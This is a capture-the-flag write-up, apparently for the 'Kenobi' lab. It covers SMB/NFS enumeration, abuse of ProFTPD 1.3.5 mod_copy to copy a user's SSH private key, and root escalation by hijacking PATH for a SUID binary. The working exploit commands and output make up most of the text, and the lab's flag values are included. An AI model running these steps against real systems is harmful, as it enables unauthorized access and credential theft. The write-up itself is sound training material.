# Kenobi

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

![](img/smb-ports.png)

## Enum

### SMB

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.94.124
smbclient -L //10.10.94.124/ -U '%'
smbclient //10.10.94.124/anonymous -U '%'
smbget -R smb://<ip>/anonymous
```

### RPC

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.94.124
```

### FTP

```console
root@kali:~/thm/kenobi# nc $TARGET 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.94.124]
^C

root@kali:~/thm/kenobi# searchsploit ProFTPD 1.3.5
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execut | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                 | linux/remote/36742.txt
------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Foothold

```console
root@kali:~/thm/kenobi# nc $TARGET 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.94.124]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

root@kali:~/thm/kenobi# cp /mnt/kenobiNFS/tmp/id_rsa .
root@kali:~/thm/kenobi# chmod +600 id_rsa 
root@kali:~/thm/kenobi# ssh -i id_rsa kenobi@$TARGET
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```

## Privesc

```console
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$ 
kenobi@kenobi:~$ strings /usr/bin/menu 
/lib64/ld-linux-x86-64.so.2                                                 
libc.so.6  
setuid                                
__isoc99_scanf    
puts         
__stack_chk_fail
printf          
system      
__libc_start_main 
__gmon_start__    
GLIBC_2.7                             
GLIBC_2.4      
GLIBC_2.2.5                           
UH-`             
AWAVA 
AUATL                                 
[]A\A]A^A_                            
***************************************
1. status check                       
2. kernel version
3. ifconfig   
** Enter your choice :
curl -I localhost
uname -r       
ifconfig   
 Invalid choice
...
kenobi@kenobi:~$ cp /bin/bash /tmp/ifconfig
kenobi@kenobi:~$ ls -lah /tmp/ifconfig 
-rwxr-xr-x 1 kenobi kenobi 1014K Jun 10 11:38 /tmp/ifconfig
kenobi@kenobi:~$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:~$ export PATH=/tmp:$PATH
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:~# cd /root
root@kenobi:/root# ls
root.txt
root@kenobi:/root# cat root.txt
177b3cd8562289f37382721c28381f02
```